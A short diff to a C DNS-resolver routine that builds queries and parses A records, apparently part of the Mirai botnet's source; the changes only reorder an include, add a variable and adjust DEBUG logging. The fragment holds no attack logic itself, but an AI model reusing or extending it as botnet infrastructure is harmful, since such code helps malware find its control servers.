@@ -13,9 +13,9 @@
 #include <errno.h>
 
 #include "includes.h"
+#include "resolv.h"
 #include "util.h"
 #include "rand.h"
-#include "resolv.h"
 #include "protocol.h"
 
 void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
@@ -71,9 +71,6 @@ struct resolv_entries *resolv_lookup(char *domain)
     struct dnshdr *dnsh = (struct dnshdr *)query;
     char *qname = (char *)(dnsh + 1);
 
-#ifdef DEBUG
-    printf("[resolv] Looking up: %s\n", domain);
-#endif
     resolv_domain_to_hostname(qname, domain);
 
     struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
@@ -154,8 +151,12 @@ struct resolv_entries *resolv_lookup(char *domain)
         }
         else if (FD_ISSET(fd, &fdset))
         {
+            #ifdef DEBUG
+                printf("[resolv] Got response from select\n");
+            #endif
             int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
             char *name;
+            struct dnsans *dnsa;
             uint16_t ancount;
             int stop;
 
@@ -196,6 +197,9 @@ struct resolv_entries *resolv_lookup(char *domain)
 
                         entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                         entries->addrs[entries->addrs_len++] = (*p);
+#ifdef DEBUG
+                        printf("[resolv] Found IP address: %d.%d.%d.%d\n", CONVERT_ADDR(*p));
+#endif
                     }
 
                     name = name + ntohs(r_data->data_len);
@@ -212,7 +216,7 @@ struct resolv_entries *resolv_lookup(char *domain)
     close(fd);
 
     #ifdef DEBUG
-        printf("[resolv] Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
+        printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
     #endif
 
     if (entries->addrs_len > 0)
